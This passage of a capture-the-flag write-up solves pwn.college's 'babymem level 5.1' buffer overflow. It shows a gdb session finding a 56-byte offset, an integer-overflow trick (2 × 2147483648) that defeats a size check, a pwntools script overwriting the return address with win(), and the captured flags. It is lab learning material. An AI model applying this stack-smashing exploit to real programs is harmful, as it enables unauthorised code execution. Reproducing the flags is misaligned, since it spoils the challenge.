```

Uses this discord thread for reference [Thread](https://discord.com/channels/750635557666816031/1246661718587867291)


### Flag

> pwn.college{8Bs6pPiWxgq0X2EmbIuuSEM3y_t.01N5IDL4czN0czW}

---

## level5.1

### Challenge

```
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
```

### Solving

Like before we have the checks in place making sure the number of our payloads and the bytes of our payloads when multiplied are lesser than 22 As such we know what to send as our first 2 sets which are ``2`` and ``2147483648``

As such lets shove this into gdb and start we make a break at the input then find the address of buffer to which we get an offset of 56


``0x7ffc5283a770`` buf address <--

``0x401dfa`` win address <--

From here lets find the return address's address 


gdb progress.
```shell
hacker@memory-errors~level5-1:~$ gdb /challenge/babymem-level-5-1 
GNU gdb (GDB) 14.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /challenge/babymem-level-5-1...
(No debugging symbols found in /challenge/babymem-level-5-1)
(gdb) set disassembly-flavor intel
(gdb) start
Temporary breakpoint 1 at 0x4020a7
Starting program: /challenge/babymem-level-5-1 

Temporary breakpoint 1, 0x00000000004020a7 in main ()
(gdb) break *challenge+0x151
Breakpoint 2 at 0x402052
(gdb) c
Continuing.
###
### Welcome to /challenge/babymem-level-5-1!
###

Number of payload records to send: 1
Size of each payload record: 1
Send your payload (up to 1 bytes)!

Breakpoint 2, 0x0000000000402052 in challenge ()
(gdb) x/gx $rsi
0x7ffc5283a770:	0x0000000000000000
(gdb) info frame
Stack level 0, frame at 0x7ffc5283a7b0:
 rip = 0x402052 in challenge; saved rip = 0x402165
 called by frame at 0x7ffc5283b7e0
 Arglist at 0x7ffc5283a7a0, args: 
 Locals at 0x7ffc5283a7a0, Previous frame's sp is 0x7ffc5283a7b0
 Saved registers:
  rbp at 0x7ffc5283a7a0, rip at 0x7ffc5283a7a8
(gdb) p 0x7ffc5283a7a8 - 0x7ffc5283a770
$1 = 56
(gdb) x/i win
   0x401dfa <win>:	endbr64
(gdb) 
```

```python
from pwn import *

p = process('/challenge/babymem-level-5-1')

p.sendline(b"2")
p.sendline(b"2147483648")

payload = b"A" * 56 + b"\xfa\x1d\x40\x00"

p.send(payload)

p.interactive()
```

```shell
hacker@memory-errors~level5-1:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-5-1': pid 618
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-5-1' stopped with exit code -11 (SIGSEGV) (pid 618)
###
### Welcome to /challenge/babymem-level-5-1!
###

Number of payload records to send: Size of each payload record: Send your payload (up to 4294967296 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{sO-kr6AAdDdrhNZ_FNGtMngdG3y.0FO5IDL4czN0czW}


[*] Got EOF while reading in interactive
```

### Flag

> pwn.college{sO-kr6AAdDdrhNZ_FNGtMngdG3y.0FO5IDL4czN0czW}

---
